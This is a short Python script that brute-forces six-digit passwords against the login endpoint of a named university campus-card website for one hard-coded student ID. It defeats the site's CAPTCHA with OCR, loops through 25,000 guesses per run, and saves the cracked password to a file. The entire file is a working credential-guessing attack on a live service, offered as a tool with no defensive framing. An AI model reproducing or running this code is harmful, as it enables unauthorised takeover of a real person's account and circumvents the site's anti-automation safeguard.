import base64
import json
import pytesseract
import requests
from PIL import Image
from io import BytesIO

# 这里填Tesseract-OCR目录把C:\\Program Files (x86)\\Tesseract-OCR改成你的路径
testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'

session = requests.session()
login_url = 'http://ykt.jsu.edu.cn/Login/LoginBySnoQuery'
index_url = 'http://ykt.jsu.edu.cn/'
img_url = 'http://ykt.jsu.edu.cn/Login/GetValidateCode?time=1541822935426'
user_url = 'http://ykt.jsu.edu.cn/User/User'


def get_valicode():
    content = session.get(url=img_url).content
    img = Image.open(BytesIO(content))
    # testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'
    valicode = pytesseract.image_to_string(img, lang='nums', config=testdata_dir_config).replace(' ', '')
    return valicode


def login(password):
    data = {
        'sno': '2018200482',
        'pwd': base64.b64encode(str(password).encode('utf-8')).decode('utf-8'),
        'ValiCode': get_valicode(),
        'remember': '1',
        'uclass': '1s',
        'zqcode': '',
        'json': 'true',
    }
    header = {
        'Host': 'ykt.jsu.edu.cn',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://ykt.jsu.edu.cn/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '81',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }
    IsSucceed = json.loads(session.post(url=login_url, data=data, headers=header).text)
    if IsSucceed['IsSucceed'] == True:
        print("登陆成功")
        return 1
    else:
        if IsSucceed['Msg'] == '验证码错误':
            print("验证码错误")
            return 0
        else:
            print(IsSucceed['Msg'] + " 错误")
            # 账户密码错误
            return 2


def gvalicode(i):
    img = session.get(url=img_url)
    with open('img/' + i + '.jpg', 'wb') as f:
        f.write(img.content)


def run():
    begin = int(input("请输入开始序号（开始+25000）："))
    print("%06d-%06d" % (begin, begin + 25000))
    for x in range(begin, begin + 25000):
        x = str('%06d' % x)
        print(x)
        with open(str(begin) + '-' + str(begin + 25000) + '.txt', 'a+') as f:
            f.write(x + "\n")
        temp = 0
        while True:
            a = login(x)
            if a == 1:
                with open('password.txt', 'w') as f:
                    f.write(x)
                print("完成")
                temp = 1
                break
            elif a == 2:
                break
            else:
                continue
        if temp == 1:
            break


if __name__ == '__main__':
    run()
